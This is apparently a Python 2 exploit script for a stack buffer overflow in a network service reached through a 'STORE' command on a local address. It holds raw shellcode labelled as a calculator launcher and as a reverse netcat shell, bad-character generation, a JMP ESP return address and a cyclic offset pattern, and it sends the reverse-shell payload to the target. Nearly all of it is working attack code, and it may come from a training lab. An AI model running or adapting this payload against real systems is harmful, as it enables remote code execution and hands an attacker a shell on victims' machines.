import socket
import struct

RHOST = "192.168.0.136"
RPORT = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

########### BAD CHARS ##############
bdch_test = ""
bdch = [0x00, 0x0A]

# gen string
for i in range(0x00, 0xFF+1):
	if i not in bdch:
		bdch_test +=chr(i)

# write file
#with open("bdch.bin", "wb") as f:
#	f.write(bdch_test)


########### END BDCH #############
########## SHELLCODE #############
shellcode_calc =  b""
shellcode_calc += b"\xbe\x4d\xdd\xd9\x34\xdb\xdf\xd9\x74\x24"
shellcode_calc += b"\xf4\x5a\x31\xc9\xb1\x31\x83\xc2\x04\x31"
shellcode_calc += b"\x72\x0f\x03\x72\x42\x3f\x2c\xc8\xb4\x3d"
shellcode_calc += b"\xcf\x31\x44\x22\x59\xd4\x75\x62\x3d\x9c"
shellcode_calc += b"\x25\x52\x35\xf0\xc9\x19\x1b\xe1\x5a\x6f"
shellcode_calc += b"\xb4\x06\xeb\xda\xe2\x29\xec\x77\xd6\x28"
shellcode_calc += b"\x6e\x8a\x0b\x8b\x4f\x45\x5e\xca\x88\xb8"
shellcode_calc += b"\x93\x9e\x41\xb6\x06\x0f\xe6\x82\x9a\xa4"
shellcode_calc += b"\xb4\x03\x9b\x59\x0c\x25\x8a\xcf\x07\x7c"
shellcode_calc += b"\x0c\xf1\xc4\xf4\x05\xe9\x09\x30\xdf\x82"
shellcode_calc += b"\xf9\xce\xde\x42\x30\x2e\x4c\xab\xfd\xdd"
shellcode_calc += b"\x8c\xeb\x39\x3e\xfb\x05\x3a\xc3\xfc\xd1"
shellcode_calc += b"\x41\x1f\x88\xc1\xe1\xd4\x2a\x2e\x10\x38"
shellcode_calc += b"\xac\xa5\x1e\xf5\xba\xe2\x02\x08\x6e\x99"
shellcode_calc += b"\x3e\x81\x91\x4e\xb7\xd1\xb5\x4a\x9c\x82"
shellcode_calc += b"\xd4\xcb\x78\x64\xe8\x0c\x23\xd9\x4c\x46"
shellcode_calc += b"\xc9\x0e\xfd\x05\x87\xd1\x73\x30\xe5\xd2"
shellcode_calc += b"\x8b\x3b\x59\xbb\xba\xb0\x36\xbc\x42\x13"
shellcode_calc += b"\x73\x22\xa1\xb6\x89\xcb\x7c\x53\x30\x96"
shellcode_calc += b"\x7e\x89\x76\xaf\xfc\x38\x06\x54\x1c\x49"
shellcode_calc += b"\x03\x10\x9a\xa1\x79\x09\x4f\xc6\x2e\x2a"
shellcode_calc += b"\x5a\xa5\xb1\xb8\x06\x04\x54\x39\xac\x58"

shellcode_rev_nc =  b""
shellcode_rev_nc += b"\xbf\xaa\x28\xb4\xfa\xd9\xe8\xd9\x74\x24"
shellcode_rev_nc += b"\xf4\x5d\x31\xc9\xb1\x52\x31\x7d\x12\x83"
shellcode_rev_nc += b"\xed\xfc\x03\xd7\x26\x56\x0f\xdb\xdf\x14"
shellcode_rev_nc += b"\xf0\x23\x20\x79\x78\xc6\x11\xb9\x1e\x83"
shellcode_rev_nc += b"\x02\x09\x54\xc1\xae\xe2\x38\xf1\x25\x86"
shellcode_rev_nc += b"\x94\xf6\x8e\x2d\xc3\x39\x0e\x1d\x37\x58"
shellcode_rev_nc += b"\x8c\x5c\x64\xba\xad\xae\x79\xbb\xea\xd3"
shellcode_rev_nc += b"\x70\xe9\xa3\x98\x27\x1d\xc7\xd5\xfb\x96"
shellcode_rev_nc += b"\x9b\xf8\x7b\x4b\x6b\xfa\xaa\xda\xe7\xa5"
shellcode_rev_nc += b"\x6c\xdd\x24\xde\x24\xc5\x29\xdb\xff\x7e"
shellcode_rev_nc += b"\x99\x97\x01\x56\xd3\x58\xad\x97\xdb\xaa"
shellcode_rev_nc += b"\xaf\xd0\xdc\x54\xda\x28\x1f\xe8\xdd\xef"
shellcode_rev_nc += b"\x5d\x36\x6b\xeb\xc6\xbd\xcb\xd7\xf7\x12"
shellcode_rev_nc += b"\x8d\x9c\xf4\xdf\xd9\xfa\x18\xe1\x0e\x71"
shellcode_rev_nc += b"\x24\x6a\xb1\x55\xac\x28\x96\x71\xf4\xeb"
shellcode_rev_nc += b"\xb7\x20\x50\x5d\xc7\x32\x3b\x02\x6d\x39"
shellcode_rev_nc += b"\xd6\x57\x1c\x60\xbf\x94\x2d\x9a\x3f\xb3"
shellcode_rev_nc += b"\x26\xe9\x0d\x1c\x9d\x65\x3e\xd5\x3b\x72"
shellcode_rev_nc += b"\x41\xcc\xfc\xec\xbc\xef\xfc\x25\x7b\xbb"
shellcode_rev_nc += b"\xac\x5d\xaa\xc4\x26\x9d\x53\x11\xe8\xcd"
shellcode_rev_nc += b"\xfb\xca\x49\xbd\xbb\xba\x21\xd7\x33\xe4"
shellcode_rev_nc += b"\x52\xd8\x99\x8d\xf9\x23\x4a\x72\x55\x2b"
shellcode_rev_nc += b"\x08\x1a\xa4\x2b\xc4\xe8\x21\xcd\xbe\x1e"
shellcode_rev_nc += b"\x64\x46\x57\x86\x2d\x1c\xc6\x47\xf8\x59"
shellcode_rev_nc += b"\xc8\xcc\x0f\x9e\x87\x24\x65\x8c\x70\xc5"
shellcode_rev_nc += b"\x30\xee\xd7\xda\xee\x86\xb4\x49\x75\x56"
shellcode_rev_nc += b"\xb2\x71\x22\x01\x93\x44\x3b\xc7\x09\xfe"
shellcode_rev_nc += b"\x95\xf5\xd3\x66\xdd\xbd\x0f\x5b\xe0\x3c"
shellcode_rev_nc += b"\xdd\xe7\xc6\x2e\x1b\xe7\x42\x1a\xf3\xbe"
shellcode_rev_nc += b"\x1c\xf4\xb5\x68\xef\xae\x6f\xc6\xb9\x26"
shellcode_rev_nc += b"\xe9\x24\x7a\x30\xf6\x60\x0c\xdc\x47\xdd"
shellcode_rev_nc += b"\x49\xe3\x68\x89\x5d\x9c\x94\x29\xa1\x77"
shellcode_rev_nc += b"\x1d\x49\x40\x5d\x68\xe2\xdd\x34\xd1\x6f"
shellcode_rev_nc += b"\xde\xe3\x16\x96\x5d\x01\xe7\x6d\x7d\x60"
shellcode_rev_nc += b"\xe2\x2a\x39\x99\x9e\x23\xac\x9d\x0d\x43"
shellcode_rev_nc += b"\xe5"
########## END SHELLCODE #############


# build exploit
buf_tot_len = 3500
#MONA PATTERN
#!mona pattern_create 1024
#!mona pattern_offset 39654138

offset_srp = 2012
# gadget JMP ESP
# 758e3132, 75943165
#ptr_jmp_esp = 0x080416bf
ptr_jmp_esp = 0x758e3132


buf = ""
buf += "A"*(offset_srp - len(buf))
#buf += "A"*2500
#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"
#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em"
buf += struct.pack("<I",ptr_jmp_esp)
# NOP SLED
#buf += "\x90"*120
# SOFT INT
#buf += "\xCC\xCC\xCC\xCC"

# sub ESP
buf += "\x83\xec\x10"
buf += shellcode_rev_nc
#buf += "BBBB"
#buf += bdch_test
buf += "D"*(buf_tot_len - len(buf))
buf += "\n"

#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"

s.send("STORE "+buf)


data = s.recv(1024)

print "Recieved:  {0}".format(data)
